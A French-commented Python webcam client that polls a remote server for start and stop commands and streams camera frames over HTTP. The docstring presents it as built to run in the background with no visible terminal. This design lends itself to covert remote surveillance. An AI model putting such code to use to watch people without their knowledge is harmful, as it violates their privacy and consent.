"""
Client caméra — se connecte au serveur par HTTP, depuis n'importe quel réseau Wi-Fi.

Compatible Windows et Linux. Conçu pour tourner en arrière-plan, sans
terminal visible : les messages vont dans un fichier log, et l'adresse
du serveur peut être mémorisée une fois pour toutes avec --save.

Utilisation :
    python client.py --server https://mon-serveur.com --save   # première fois
    python client.py                                           # ensuite (relit la config)
    python client.py --server https://autre-serveur.com         # remplace, sans sauvegarder
    python client.py --once --debug                             # test : un seul cycle, logs détaillés
"""

import argparse
import json
import logging
import os
import platform
import time
import threading
from pathlib import Path

import cv2
import requests

DEFAULT_SERVER_URL = "http://127.0.0.1:5050"
POLL_INTERVAL = 1.0       # secondes entre deux vérifications de commande
FRAME_INTERVAL = 0.1      # secondes entre deux images envoyées (~10 im/s)
REQUEST_TIMEOUT = 5


# ---------------------------------------------------------------------
# Emplacements (adaptés à l'OS) : logs + configuration
# ---------------------------------------------------------------------

def _app_dir() -> Path:
    if platform.system() == "Windows":
        base = Path(os.environ.get("LOCALAPPDATA", Path.home()))
        return base / "CameraClient"
    return Path.home() / ".local" / "share" / "camera-client"


APP_DIR = _app_dir()
APP_DIR.mkdir(parents=True, exist_ok=True)
CONFIG_PATH = APP_DIR / "config.json"

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[
        logging.FileHandler(APP_DIR / "client.log", encoding="utf-8"),
        logging.StreamHandler(),
    ],
)
logger = logging.getLogger("camera-client")


def load_config() -> dict:
    if CONFIG_PATH.exists():
        try:
            return json.loads(CONFIG_PATH.read_text(encoding="utf-8"))
        except (json.JSONDecodeError, OSError):
            logger.warning("Fichier de configuration illisible, ignoré : %s", CONFIG_PATH)
    return {}


def save_config(server_url: str) -> None:
    CONFIG_PATH.write_text(json.dumps({"server_url": server_url}, indent=2), encoding="utf-8")
    try:
        os.chmod(CONFIG_PATH, 0o600)  # pas d'effet sous Windows, inoffensif
    except OSError:
        pass
    logger.info("Configuration sauvegardée : %s", CONFIG_PATH)


def resolve_server_url(cli_value: str | None) -> str:
    if cli_value:
        return cli_value.rstrip("/")
    config_value = load_config().get("server_url")
    if config_value:
        return config_value.rstrip("/")
    return DEFAULT_SERVER_URL


def _open_camera() -> cv2.VideoCapture:
    """Ouvre la caméra avec le backend le plus fiable selon l'OS."""
    if platform.system() == "Windows":
        return cv2.VideoCapture(0, cv2.CAP_DSHOW)
    return cv2.VideoCapture(0)


class CameraClient:
    def __init__(self, server_url: str):
        self.server_url = server_url
        self.camera_on = False
        self.capture: cv2.VideoCapture | None = None
        self._stop_streaming = threading.Event()

    def run_forever(self) -> None:
        logger.info("Démarrage du client — serveur : %s", self.server_url)
        while True:
            try:
                self._check_command()
            except requests.RequestException as exc:
                logger.warning("Serveur injoignable (%s), nouvelle tentative...", exc)
            time.sleep(POLL_INTERVAL)

    def run_once(self) -> None:
        logger.info("Test (--once) — serveur : %s", self.server_url)
        self._check_command()
        time.sleep(1)  # laisse une chance au flux de démarrer avant de couper
        if self.camera_on:
            self._stop_camera()

    def _check_command(self) -> None:
        response = requests.get(f"{self.server_url}/api/command", timeout=REQUEST_TIMEOUT)
        response.raise_for_status()
        command = response.json().get("command")
        logger.debug("Commande reçue : %s", command)

        if command == "START_CAMERA" and not self.camera_on:
            self._start_camera()
        elif command == "STOP_CAMERA" and self.camera_on:
            self._stop_camera()

    def _start_camera(self) -> None:
        self.capture = _open_camera()
        if not self.capture.isOpened():
            logger.error("Impossible d'ouvrir la caméra")
            self.capture = None
            return

        self.camera_on = True
        self._stop_streaming.clear()
        threading.Thread(target=self._stream_frames, daemon=True).start()
        logger.info("Caméra allumée")

    def _stop_camera(self) -> None:
        self.camera_on = False
        self._stop_streaming.set()
        if self.capture is not None:
            self.capture.release()
            self.capture = None
        logger.info("Caméra éteinte")

    def _stream_frames(self) -> None:
        while not self._stop_streaming.is_set() and self.capture is not None:
            ok, frame = self.capture.read()
            if not ok:
                continue

            ok, buffer = cv2.imencode(".jpg", frame, [cv2.IMWRITE_JPEG_QUALITY, 70])
            if not ok:
                continue

            try:
                requests.post(
                    f"{self.server_url}/api/frame",
                    data=buffer.tobytes(),
                    headers={"Content-Type": "application/octet-stream"},
                    timeout=REQUEST_TIMEOUT,
                )
            except requests.RequestException:
                pass  # on retentera à la prochaine image

            time.sleep(FRAME_INTERVAL)


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description="Client caméra piloté à distance")
    parser.add_argument("--server", help="URL du serveur (ex. https://mon-serveur.onrender.com)")
    parser.add_argument("--save", action="store_true", help="mémorise --server pour les prochains lancements")
    parser.add_argument("--debug", action="store_true", help="affiche les logs détaillés (commandes reçues, etc.)")
    parser.add_argument("--once", action="store_true", help="un seul cycle de test, puis quitte")
    return parser.parse_args()


def main() -> None:
    args = parse_args()
    if args.debug:
        logging.getLogger().setLevel(logging.DEBUG)

    server_url = resolve_server_url(args.server)
    if args.save:
        if not args.server:
            logger.error("--save nécessite --server")
            return
        save_config(server_url)

    client = CameraClient(server_url)
    if args.once:
        client.run_once()
    else:
        client.run_forever()


if __name__ == "__main__":
    main()
